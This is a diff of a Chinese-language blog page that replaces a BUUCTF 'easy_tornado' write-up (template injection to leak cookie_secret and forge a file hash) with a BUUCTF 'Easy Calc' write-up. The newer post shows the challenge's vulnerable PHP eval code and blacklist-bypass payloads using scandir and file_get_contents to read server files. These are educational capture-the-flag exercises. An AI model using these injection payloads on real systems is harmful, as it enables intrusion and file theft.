@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CTF," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,20 +79,17 @@
 
 
 
-<meta name="description" content="easy_tornado 1打开环境就看到三个链接，依次打开得到：flag in &#x2F;fllllllllllllag render md5(cookie_secret+md5(filename)) 目前看来只有第一个和第三个有用flag在&#x2F;fllllllllllllag目录下用到了md5 我觉得cookie_secret有点东西，百度了一下果然发现了题目https:&#x2F;&#x2F;www.cnblogs.com">
-<meta name="keywords" content="CTF">
+<meta name="description" content="Easy Calc打开环境是个计算器，搜索一下Calc是什么 最后发现是CSS中的一个样式，用于进行一下计算http:&#x2F;&#x2F;caibaojian.com&#x2F;css3-calc.html 尝试一下注入 1234输入1 正常1’ 没有报错1&amp;apos;# 直接给PASS了 到这里考虑不是SQL注入题 crtl+u看一下源码 看到作者给了提示 写了WAF保障安全 WAF： 12345678910111213">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF-easy_tornado 1">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;18&#x2F;BUUCTF-easy-tornado-1&#x2F;index.html">
+<meta property="og:title" content="BUUCTF-Easy Calc">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;21&#x2F;BUUCTF-Easy-Calc&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="easy_tornado 1打开环境就看到三个链接，依次打开得到：flag in &#x2F;fllllllllllllag render md5(cookie_secret+md5(filename)) 目前看来只有第一个和第三个有用flag在&#x2F;fllllllllllllag目录下用到了md5 我觉得cookie_secret有点东西，百度了一下果然发现了题目https:&#x2F;&#x2F;www.cnblogs.com">
+<meta property="og:description" content="Easy Calc打开环境是个计算器，搜索一下Calc是什么 最后发现是CSS中的一个样式，用于进行一下计算http:&#x2F;&#x2F;caibaojian.com&#x2F;css3-calc.html 尝试一下注入 1234输入1 正常1’ 没有报错1&amp;apos;# 直接给PASS了 到这里考虑不是SQL注入题 crtl+u看一下源码 看到作者给了提示 写了WAF保障安全 WAF： 12345678910111213">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;tornado&#x2F;0.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;tornado&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;tornado&#x2F;2.png">
-<meta property="og:updated_time" content="2020-01-18T02:10:43.468Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF%5CEasy_Calc&#x2F;0.png">
+<meta property="og:updated_time" content="2020-01-21T02:47:03.887Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF&#x2F;tornado&#x2F;0.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;BUUCTF%5CEasy_Calc&#x2F;0.png">
 
 
 
@@ -122,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/18/BUUCTF-easy-tornado-1/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/01/21/BUUCTF-Easy-Calc/"/>
 
 
 
 
 
-  <title>BUUCTF-easy_tornado 1 | diao-diao-UPUP</title>
+  <title>BUUCTF-Easy Calc | diao-diao-UPUP</title>
   
 
 
@@ -255,7 +252,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/BUUCTF-easy-tornado-1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/BUUCTF-Easy-Calc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="diao-diao">
@@ -272,7 +269,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">BUUCTF-easy_tornado 1</h1>
+          <h1 class="post-title" itemprop="name headline">BUUCTF-Easy Calc</h1>
         
 
         <div class="post-meta">
@@ -284,8 +281,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-18T09:06:00+08:00">
-                2020-01-18
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-21T10:21:08+08:00">
+                2020-01-21
               </time>
             
 
@@ -294,28 +291,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -344,26 +319,33 @@
       
 
       
-        <h1 id="easy-tornado-1"><a href="#easy-tornado-1" class="headerlink" title="easy_tornado 1"></a>easy_tornado 1</h1><p>打开环境就看到三个链接，依次打开得到：<br>flag in /fllllllllllllag</p>
-<p>render</p>
-<p>md5(cookie_secret+md5(filename))</p>
-<p>目前看来只有第一个和第三个有用<br>flag在/fllllllllllllag目录下<br>用到了md5</p>
-<p>我觉得cookie_secret有点东西，百度了一下果然发现了题目<br><a href="https://www.cnblogs.com/liyqiang/p/7140530.html" target="_blank" rel="noopener">https://www.cnblogs.com/liyqiang/p/7140530.html</a></p>
-<p>emmmm 貌似tornado是python的一个框架，python还木有学，太尴尬了<br>只好查资料，最后得到：<br>render好像是个渲染函数之类的</p>
-<p>先随便看看：<br>尝试一下文件包含</p>
-<p><img src="/images/BUUCTF/tornado/0.png" alt="avatar"></p>
-<p>返回了错误界面，没有思路了，只好看看大佬的WP，存在模板注入；<br>Tornado可以参考这里：<br><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
-<p>error改成：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?msg=&#123;&#123;handler.settings&#125;&#125;  handler.settings获取环境变量</span><br></pre></td></tr></table></figure>
+        <h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h1><p>打开环境是个计算器，搜索一下Calc是什么</p>
+<p>最后发现是CSS中的一个样式，用于进行一下计算<br><a href="http://caibaojian.com/css3-calc.html" target="_blank" rel="noopener">http://caibaojian.com/css3-calc.html</a></p>
+<p>尝试一下注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1 正常</span><br><span class="line">1’ 没有报错</span><br><span class="line">1&apos;# 直接给PASS了</span><br></pre></td></tr></table></figure>
+<p>到这里考虑不是SQL注入题</p>
+<p>crtl+u看一下源码 看到作者给了提示 写了WAF保障安全</p>
+<p>WAF：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/BUUCTF/tornado/1.png" alt="avatar"></p>
-<p>成功得到了cookie_secret<br>接下来就只需解决md5的问题了</p>
-<p>然后，尴尬的问题又来了，不会写脚本 哭了，还是python的<br>所以说，开发和安全缺一不可，只好去找大佬的脚本<br><img src="/images/BUUCTF/tornado/2.png" alt="avatar"></p>
-<p>构造payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;&amp;filehash=97a05accf0b1378842a54ec11b3074cb</span><br></pre></td></tr></table></figure>
+<p>$(“#content”).val()是什么意思？  百度一下得知类似于HTML中的document.getElementById(“content”); </p>
+<p>再百度一下encodeURIComponent 得知是将参数进行URI编码</p>
+<p>再查看一下calc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>根据WAF来进行绕过</p>
+<p>接下来构造payload：<br>使用scandir（）返回根目录看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1;var_dump(scandir(/));</span><br></pre></td></tr></table></figure>
+<p>发现不行 这里没有思路了 看一下WP知道了</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
+<p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUUCTF%5CEasy_Calc/0.png" alt="avatar"></p>
+<p>找到flagg目录</p>
+<p>那就继续读取 使用file_get_contents</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
-<p>学到了学到了 看完脚本之后，我觉得还是很简单的，就是没学python不懂语法，待我去肝一肝python</p>
 
       
     </div>
@@ -379,12 +361,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-        </div>
-      
 
       
       
@@ -394,8 +370,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/" rel="next" title="BUUCTF-随便注 1">
-                <i class="fa fa-chevron-left"></i> BUUCTF-随便注 1
+              <a href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/" rel="next" title="攻防世界-ics-06">
+                <i class="fa fa-chevron-left"></i> 攻防世界-ics-06
               </a>
             
           </div>
@@ -404,8 +380,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/01/18/BUUCTF-EasySQL-1/" rel="prev" title="BUUCTF-EasySQL 1">
-                BUUCTF-EasySQL 1 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/01/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-lottery/" rel="prev" title="攻防世界-lottery">
+                攻防世界-lottery <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -558,7 +534,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-tornado-1"><span class="nav-number">1.</span> <span class="nav-text">easy_tornado 1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Easy-Calc"><span class="nav-number">1.</span> <span class="nav-text">Easy Calc</span></a></li></ol></div>
             
 
           </div>
